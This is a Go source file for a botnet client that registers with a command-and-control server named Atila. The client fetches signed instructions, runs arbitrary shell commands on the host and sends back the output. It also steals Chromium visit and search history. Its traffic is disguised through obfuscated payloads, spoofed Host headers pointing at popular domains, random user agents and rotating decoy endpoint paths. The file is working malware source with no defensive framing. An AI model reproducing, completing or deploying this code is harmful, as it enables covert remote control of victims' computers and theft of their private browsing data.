package main

import (
	"bytes"
	"crypto/rsa"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"xena/helpers"
	"xena/modules"
	"xena/networking"
	"xena/services"

	"github.com/golang-jwt/jwt"
)

// Content of reply message.
type ParsedMessageContnet struct {
	Shell string `json:"shell"` // Shell code.
}

// Message received from the server.
type Message struct {
	Id      string `json:"id"`      // Unique identifier.
	From    string `json:"from"`    // Node which originally issued the message.
	To      string `json:"to"`      // Which node should receive message.
	Subject string `json:"subject"` // Key used for rounting of the content into different code paths.
	Content string `json:"content"` // Base64 encoded data.
	Status  string `json:"status"`  // Message's state.
	ReplyTo string `json:"replyTo"` // Original message ID.
}

// Message going towards the server.
type ReplyMessage struct {
	From    string `json:"from"`    // Node which originally issued the message.
	Subject string `json:"subject"` // Key used for rounting of the content into different code paths.
	Content string `json:"content"` // Base64 encoded data.
	ReplyTo string `json:"replyTo"` // Message ID.
}

// Corresponds to ReplyMessage.Content, keep in mind that this type needs to be
// converted into string by making it into a JWT, prior to assigning it to ReplyMessage.Content
type ReplyContent struct {
	ShellOutput        string            `json:"shellOutput"`        // Output of executed shell code.
	OsDetails          modules.OsDetails `json:"osDetails"`          // Basic information about the system.
	Other              string            `json:"other"`              // Any string of data.
	WebSearchResults   []string          `json:"webSearchResults"`   // A slice of strings made out of web search results. (url links)
	WebHistoryVisits   []string          `json:"webHistoryVisits"`   // A slice of strings made out of web url visit history from a browser.
	WebHistorySearches []string          `json:"webHistorySearches"` // A slice of strings representing search terms from a browser.
}

// IdentifyPayload is a structure corresponding to Atila's bot identification endpoint.
type IdentifyPayload struct {
	Id        string `json:"id"`        // UUID of the bot. (self-generated)
	PublicKey string `json:"publicKey"` // Public key of the bot.
	Os        string `json:"os"`        // Name of the operating system.
	Status    string `json:"status"`    // Bot's status.
}

// Payload for endpoint of Atila for message's ack.
type MessageAck struct {
	Id     string `json:"id"`
	Status string `json:"status"`
}

// identify makes the bot known to the Atila server. Returns true if identification was successful.
func identify(host, id string, publicKey *rsa.PublicKey) error {
	// Bot's identification details which will be stored in the Atila's database.
	details := IdentifyPayload{
		Id:        id,
		PublicKey: modules.PublicKeyToPEM(publicKey),
		Os:        modules.GetOsDetails().Os,
		Status:    "ALIVE",
	}

	detailsJson, err := json.Marshal(details)
	if err != nil {
		return err
	}

	// Obfuscate the payload.
	payloadJson, err := networking.SerializedTraffic(string(detailsJson))
	if err != nil {
		return err
	}

	request, err := http.NewRequest("POST", host+helpers.RandEntry(atilaClientInsertMap), bytes.NewBuffer([]byte(payloadJson)))
	request.Host = helpers.RandomPopularDomain()
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", helpers.RandomUserAgent())
	if err != nil {
		return err
	}
	defer request.Body.Close()

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	// StatusNoContent - We have been inserted into the database.
	// StatusConflict - We are already in the database.
	if response.StatusCode != http.StatusCreated && response.StatusCode != http.StatusConflict {
		fmt.Println("Identification failed with status code: " + strconv.Itoa(response.StatusCode) + ", expected:" + strconv.Itoa(http.StatusCreated) + "," + strconv.Itoa(http.StatusConflict))
		return errors.New("status code does not match")
	}

	return nil
}

// messageAck changes a message's state. This will prevent the Atila from sending that message again.
func messageAck(host, messageId string) error {
	messageAck := MessageAck{
		Id:     messageId,
		Status: "SEEN",
	}

	messageAckJson, err := json.Marshal(messageAck)
	if err != nil {
		return err
	}

	payloadJson, err := networking.SerializedTraffic(string(messageAckJson))
	if err != nil {
		return err
	}

	request, err := http.NewRequest("POST", host+helpers.RandEntry(atilaAckMessageMap), bytes.NewBuffer([]byte(payloadJson)))
	request.Host = helpers.RandomPopularDomain()
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", helpers.RandomUserAgent())
	if err != nil {
		return err
	}

	client := &http.Client{}

	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err)
	}

	defer response.Body.Close()

	if response.StatusCode != http.StatusNoContent {
		fmt.Println("Message ack. failed with status code: " + strconv.Itoa(response.StatusCode) + ", expected:" + strconv.Itoa(http.StatusNoContent))
		return errors.New("status code does not match")
	}

	// alreadyExecutedMessages = append(alreadyExecutedMessages, messageId)

	return nil
}

// sendMessage makes a POST request to Atila which saves the message reply.
func sendMessage(host string, message Message) error {
	insertionJson, err := json.Marshal(message)
	if err != nil {
		return err
	}

	payloadJson, err := networking.SerializedTraffic(string(insertionJson))
	if err != nil {
		return err
	}

	request, err := http.NewRequest("POST", host+helpers.RandEntry(atilaPostMessageMap), bytes.NewBuffer([]byte(payloadJson)))
	request.Host = helpers.RandomPopularDomain()
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", helpers.RandomUserAgent())
	if err != nil {
		return err
	}

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusCreated {
		fmt.Println("Message sending failed with status code: " + strconv.Itoa(response.StatusCode) + ", expected:" + strconv.Itoa(http.StatusCreated) + "," + strconv.Itoa(http.StatusConflict))
		return errors.New("status code does not match")
	}

	return nil
}

// interpretMessage given the message it will generate a reply message.
func interpretMessage(host string, message Message) (Message, error) {
	var reply Message = Message{
		From:    message.To,
		ReplyTo: message.Id,
	}

	if message.Subject != "instruction" {
		return reply, errors.New("unrecognized message subject")
	}

	// Message's content.
	content := ParsedMessageContnet{}

	// Verify the message's content.
	token, err := jwt.Parse(message.Content, func(token *jwt.Token) (interface{}, error) {
		if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
			return nil, errors.New("invalid signing algorithm")
		}
		return trustedPublicKey, nil
	})
	if err != nil {
		return reply, err
	}

	if claims, ok := token.Claims.(jwt.MapClaims); ok && token.Valid {
		if claims["shell"] != nil {
			content.Shell = fmt.Sprint(claims["shell"])
		}
	} else {
		return reply, errors.New("invalid token's signature")
	}

	// Execute content.
	replyContent := ReplyContent{}

	// Get system's details.
	if content.Shell == "/os" {
		replyContent.OsDetails = modules.GetOsDetails()

		// Add a bot peer.
	} else if strings.HasPrefix(content.Shell, "/addPeer ") {
		peerAddress := content.Shell[9:]
		entitiesPool = append(entitiesPool, Entity{
			Address: peerAddress,
		})
		replyContent.Other = "Added peer:" + peerAddress

		// Grab Chromium history of visits.
	} else if content.Shell == "/browserVisits" {
		visits, err := modules.GrabChromiumHistory("VISITS")
		if err != nil {
			return reply, err
		}

		replyContent.WebHistoryVisits = visits

		// Grab Chromium history of search terms.
	} else if content.Shell == "/browserSearches" {
		searches, err := modules.GrabChromiumHistory("TERMS")
		if err != nil {
			return reply, err
		}

		replyContent.WebHistorySearches = searches

		// Perform web search using duckduckgo.
	} else if strings.HasPrefix(content.Shell, "/duckit ") {
		term := content.Shell[8:]
		searchResults, err := services.Duckit(term)
		if err != nil {
			return reply, err
		}
		replyContent.WebSearchResults = searchResults

		// If nothing maches then just execute it in the shell and return the result.
	} else {
		replyContent.ShellOutput, err = modules.RunTerminal(content.Shell)
		if err != nil {
			return reply, err
		}
	}

	// Sign the reply with the private key.
	replyToken := jwt.NewWithClaims(jwt.SigningMethodRS512, jwt.MapClaims{
		"shellOutput":        replyContent.ShellOutput,
		"osDetails":          replyContent.OsDetails,
		"other":              replyContent.Other,
		"webSearchResults":   replyContent.WebSearchResults,
		"webHistoryVisits":   replyContent.WebHistoryVisits,
		"webHistorySearches": replyContent.WebHistorySearches,
	})

	replyTokenString, err := replyToken.SignedString(privateIdentificationKey)
	if err != nil {
		return reply, err
	}

	reply.Subject = "shell-output"
	reply.Content = replyTokenString

	return reply, nil
}

// fetchMessages reaches out to Atila (cnc) and gets the unseen messages.
// Do remember to ack. the message after interpreting it and issue the response.
func fetchMessages(host, id string) ([]Message, error) {
	var messages []Message

	request, err := http.NewRequest("GET", host+helpers.RandEntry(atilaFetchMessagesMap)+"?status=SENT&clientId="+id, nil)
	request.Host = helpers.RandomPopularDomain()
	request.Header.Set("User-Agent", helpers.RandomUserAgent())
	if err != nil {
		return messages, err
	}

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return messages, err
	}
	defer response.Body.Close()

	jsonDecoder := json.NewDecoder(response.Body)
	jsonDecoder.DisallowUnknownFields()
	err = jsonDecoder.Decode(&messages)
	if err != nil {
		return messages, err
	}

	if response.StatusCode != http.StatusOK && response.StatusCode != http.StatusNoContent {
		fmt.Println("Message fetching failed with status code: " + strconv.Itoa(response.StatusCode) + ", expected:" + strconv.Itoa(http.StatusOK) + "," + strconv.Itoa(http.StatusNoContent))
		return messages, errors.New("status code does not match")
	}

	return messages, nil
}

// Xena-Service-Atila GET /v1/clients
var atilaClientInsertMap = []string{
	"/v1/clients",
	"/v1/account/user",
	"/v1/account/userPreferences",
	"/v1/common/notifications",
	"/v1/asset",
	"/blog",
	"/books",
	"/calendar",
	"/careers",
	"/people",
	"/documentation",
	"/faq",
	"/help",
	"/watch",
}

// Xena-Service-Atila GET /v1/messages
var atilaFetchMessagesMap = []string{
	"/v1/messages",
	"/v1/logs",
	"/home",
	"/profile",
	"/discussion",
	"/edit",
	"/support",
	"/forum",
	"/news",
	"/notifications",
	"/v1/notifications",
	"/v2/notifications",
	"/settings",
	"/v1/settings",
	"/v2/settings",
	"/shop",
}

// Xena-Service-Atila POST /v1/messages
var atilaPostMessageMap = []string{
	"/v1/settings",
	"/v2/edit",
	"/v2/edit/post",
	"/v1/readings",
	"/accounts",
	"/assets/images",
	"/blog/rss",
	"/company",
	"/create",
	"/events",
	"/jobs",
	"/products",
	"/search",
}

// Xena-Service-Atila POST /v1/messages/ack
var atilaAckMessageMap = []string{
	"/v1/messages/ack",
	"/style",
	"/v1/events",
	"/v1/playground",
	"/v2/graphql",
	"/v1/solutions/search",
	"/sport",
	"/views",
	"/v1/views",
	"/v2/views/data",
	"/play",
	"/confirmations",
}
